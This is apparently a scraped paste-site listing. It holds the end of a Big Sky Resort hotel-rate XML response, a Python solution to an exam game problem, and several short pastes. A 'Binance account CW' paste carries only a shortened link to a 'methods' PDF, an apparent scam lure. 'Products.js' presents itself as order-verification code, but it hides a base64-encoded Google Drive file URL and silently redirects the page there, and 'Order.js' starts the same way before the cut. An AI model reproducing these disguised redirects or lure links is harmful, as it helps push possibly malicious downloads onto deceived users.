            <extras>0.0000</extras>
            <grats>125.3100</grats>
            <taxes>160.3900</taxes>
            <package>1253.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1538.7700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1SC</unittype>
            <unitnumber />
            <unitdescription>Summit Q,QS 1 Bed</unitdescription>
            <unitpic />
            <firstnite>697.5900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1678.0700</unitrate>
            <subtotal>1678.0700</subtotal>
            <extras>0.0000</extras>
            <grats>167.8100</grats>
            <taxes>214.7900</taxes>
            <package>1678.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2060.6700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U2SCC</unittype>
            <unitnumber />
            <unitdescription>Summit 3Q 2 Bed</unitdescription>
            <unitpic />
            <firstnite>998.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2658.0700</unitrate>
            <subtotal>2658.0700</subtotal>
            <extras>0.0000</extras>
            <grats>265.8100</grats>
            <taxes>340.2300</taxes>
            <package>2658.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3264.1100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U3SCC</unittype>
            <unitnumber />
            <unitdescription>Summit 3 Bed</unitdescription>
            <unitpic />
            <firstnite>1919.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>4708.0700</unitrate>
            <subtotal>4708.0700</subtotal>
            <extras>0.0000</extras>
            <grats>470.8100</grats>
            <taxes>602.6300</taxes>
            <package>4708.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""5781.5100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1001P</unittype>
            <unitnumber />
            <unitdescription>3 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>4989.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>12268.0700</unitrate>
            <subtotal>12268.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1226.8100</grats>
            <taxes>1570.3100</taxes>
            <package>12268.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""15065.1900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1005P</unittype>
            <unitnumber />
            <unitdescription>3 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>3515.8500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>8648.0700</unitrate>
            <subtotal>8648.0700</subtotal>
            <extras>0.0000</extras>
            <grats>864.8100</grats>
            <taxes>1106.9500</taxes>
            <package>8648.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""10619.8300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1006P</unittype>
            <unitnumber />
            <unitdescription>5 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>5542.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>13638.0700</unitrate>
            <subtotal>13638.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1363.8100</grats>
            <taxes>1745.6700</taxes>
            <package>13638.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""16747.5500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U1003P</unittype>
            <unitnumber />
            <unitdescription>4 Bdrm Penthouse</unitdescription>
            <unitpic />
            <firstnite>4989.4500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>12268.0700</unitrate>
            <subtotal>12268.0700</subtotal>
            <extras>0.0000</extras>
            <grats>1226.8100</grats>
            <taxes>1570.3100</taxes>
            <package>12268.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""15065.1900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>T1VC</unittype>
            <unitnumber />
            <unitdescription>Village Center 1 bdr</unitdescription>
            <unitpic />
            <firstnite>708.6200</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1780.0700</unitrate>
            <subtotal>1618.0700</subtotal>
            <extras>162.0000</extras>
            <grats>161.8100</grats>
            <taxes>207.1200</taxes>
            <package>1780.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>162.0000</batchedextras>
            <total amount=""2149.0000"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OU8512</unittype>
            <unitnumber />
            <unitdescription>Snowcrest 8512</unitdescription>
            <unitpic />
            <firstnite>1318.8700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>3222.0000</unitrate>
            <subtotal>3222.0000</subtotal>
            <extras>0.0000</extras>
            <grats>322.2000</grats>
            <taxes>412.4100</taxes>
            <package>3222.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3956.6100"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OU8513</unittype>
            <unitnumber />
            <unitdescription>Snowcrest 8513</unitdescription>
            <unitpic />
            <firstnite>1546.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>3777.0000</unitrate>
            <subtotal>3777.0000</subtotal>
            <extras>0.0000</extras>
            <grats>377.7000</grats>
            <taxes>483.4500</taxes>
            <package>3777.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""4638.1500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUA08S</unittype>
            <unitnumber />
            <unitdescription>Alpine Meadows #8</unitdescription>
            <unitpic />
            <firstnite>1128.5300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2757.0000</unitrate>
            <subtotal>2757.0000</subtotal>
            <extras>0.0000</extras>
            <grats>275.7000</grats>
            <taxes>352.8900</taxes>
            <package>2757.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3385.5900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUA11S</unittype>
            <unitnumber />
            <unitdescription>Alpine Meadows #11</unitdescription>
            <unitpic />
            <firstnite>1128.5300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2757.0000</unitrate>
            <subtotal>2757.0000</subtotal>
            <extras>0.0000</extras>
            <grats>275.7000</grats>
            <taxes>352.8900</taxes>
            <package>2757.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3385.5900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>MUH18</unittype>
            <unitnumber />
            <unitdescription>Half Hitch Home-5BR</unitdescription>
            <unitpic />
            <firstnite>3351.2100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>8187.0000</unitrate>
            <subtotal>8187.0000</subtotal>
            <extras>0.0000</extras>
            <grats>818.7000</grats>
            <taxes>1047.9300</taxes>
            <package>8187.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""10053.6300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OA21B</unittype>
            <unitnumber />
            <unitdescription>Alpenglow #21B</unitdescription>
            <unitpic />
            <firstnite>796.9700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1907.0000</unitrate>
            <subtotal>1907.0000</subtotal>
            <extras>0.0000</extras>
            <grats>190.7000</grats>
            <taxes>244.0900</taxes>
            <package>1907.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2341.7900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OS1732</unittype>
            <unitnumber />
            <unitdescription>Skycrest #1732</unitdescription>
            <unitpic />
            <firstnite>975.0300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2382.0000</unitrate>
            <subtotal>2382.0000</subtotal>
            <extras>0.0000</extras>
            <grats>238.2000</grats>
            <taxes>304.8900</taxes>
            <package>2382.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2925.0900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>OL305C</unittype>
            <unitnumber />
            <unitdescription>Lone Moose #305C</unitdescription>
            <unitpic />
            <firstnite>747.8500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1827.0000</unitrate>
            <subtotal>1827.0000</subtotal>
            <extras>0.0000</extras>
            <grats>182.7000</grats>
            <taxes>233.8500</taxes>
            <package>1827.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2243.5500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O1BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>545.2300</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1332.0000</unitrate>
            <subtotal>1332.0000</subtotal>
            <extras>0.0000</extras>
            <grats>133.2000</grats>
            <taxes>170.4900</taxes>
            <package>1332.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1635.6900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O2BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 2 Bedroom</unitdescription>
            <unitpic />
            <firstnite>600.4900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1467.0000</unitrate>
            <subtotal>1467.0000</subtotal>
            <extras>0.0000</extras>
            <grats>146.7000</grats>
            <taxes>187.7700</taxes>
            <package>1467.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1801.4700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O3BG</unittype>
            <unitnumber />
            <unitdescription>Big Horn 3 Bedroom</unitdescription>
            <unitpic />
            <firstnite>796.9700</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1907.0000</unitrate>
            <subtotal>1907.0000</subtotal>
            <extras>0.0000</extras>
            <grats>190.7000</grats>
            <taxes>244.0900</taxes>
            <package>1907.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""2341.7900"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O5PR</unittype>
            <unitnumber />
            <unitdescription>Powder Ridge 5 BR</unitdescription>
            <unitpic />
            <firstnite>2000.4100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>4887.0000</unitrate>
            <subtotal>4887.0000</subtotal>
            <extras>0.0000</extras>
            <grats>488.7000</grats>
            <taxes>625.5300</taxes>
            <package>4887.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""6001.2300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O1SW</unittype>
            <unitnumber />
            <unitdescription>Stillwater 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>404.0100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>987.0000</unitrate>
            <subtotal>987.0000</subtotal>
            <extras>0.0000</extras>
            <grats>98.7000</grats>
            <taxes>126.3300</taxes>
            <package>987.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1212.0300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>O2SL</unittype>
            <unitnumber />
            <unitdescription>Stillwater 1BR Loft</unitdescription>
            <unitpic />
            <firstnite>557.5100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1409.5000</unitrate>
            <subtotal>1409.5000</subtotal>
            <extras>0.0000</extras>
            <grats>140.9600</grats>
            <taxes>180.4100</taxes>
            <package>1409.5000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1730.8700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>M2SR</unittype>
            <unitnumber />
            <unitdescription>Saddleridge 2 BR</unitdescription>
            <unitpic />
            <firstnite>625.0500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1527.0000</unitrate>
            <subtotal>1527.0000</subtotal>
            <extras>0.0000</extras>
            <grats>152.7000</grats>
            <taxes>195.4500</taxes>
            <package>1527.0000</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1875.1500"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>M3SR</unittype>
            <unitnumber />
            <unitdescription>Saddleridge 2+ BR</unitdescription>
            <unitpic />
            <firstnite>1007.7900</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>2462.0100</unitrate>
            <subtotal>2462.0100</subtotal>
            <extras>0.0000</extras>
            <grats>246.2100</grats>
            <taxes>315.1500</taxes>
            <package>2462.0100</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""3023.3700"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
      </hotelrateresults>
   </soap:Body>
</soap:Envelope>"
MSm8A264,Binance account CW,Thelapse,JavaScript,Wednesday 2nd of April 2025 12:20:55 PM CDT," 
Pdf https://tinyurl.com/methodssss


x1fB7RHnSy
"
cGP6kjjB,Products.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:17:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/055/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
djbALa6k,19 две кучи,nq1s788,Python,Wednesday 2nd of April 2025 12:16:36 PM CDT,"#https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&answers=on&varId=2
from functools import lru_cache


def moves(h):
    x, y = h
    return (x + 1, y), (x, y + 1), (x * 2, y), (x, y * 2)


@lru_cache(None)
def game(h):
    if sum(h) >= 227:
        return 'win'
    elif any(game(m) == 'win' for m in moves(h)):
        return'p1'
    elif all(game(m) == 'p1' for m in moves(h)):
        return'v1'
    elif any(game(m) == 'v1' for m in moves(h)):
        return'p2'
    elif all(game(m) in ['p1', 'p2'] for m in moves(h)):
        return'v2'


def p19(h):
    return any(game(m) == 'p1' for m in moves(h))


print([s for s in range(1, 210) if p19((17, s))])
print([s for s in range(1, 210) if game((17, s)) == 'p2'])
print([s for s in range(1, 210) if game((17, s)) == 'v2'])"
pTvT3a6h,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:01:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/431/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
